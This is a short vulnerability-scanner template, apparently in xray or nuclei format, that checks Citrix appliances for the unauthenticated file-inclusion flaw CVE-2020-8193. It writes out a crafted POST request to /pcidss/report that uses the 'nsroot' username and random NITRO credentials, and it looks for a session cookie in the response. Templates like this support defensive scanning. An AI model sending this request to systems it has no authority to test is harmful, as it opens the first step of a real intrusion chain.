id: CVE-2020-8193

info:
    name: Citrix unauthenticated LFI
    author: bufsnake(https://github.com/bufsnake)
    severity: medium

set:
    user: randomLowercase(8)
    pass: randomLowercase(8)
rules:
    r0:
        request:
            method: POST
            path: /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1
            headers:
                Content-Type: application/xml
                X-NITRO-PASS: '{{pass}}'
                X-NITRO-USER: '{{user}}'
            body: <appfwprofile><login></login></appfwprofile>
        expression: response.status == 406 && "(?i)SESSID=\\w{32}".bmatches(bytes(response.headers["set-cookie"]))
expression: r0()
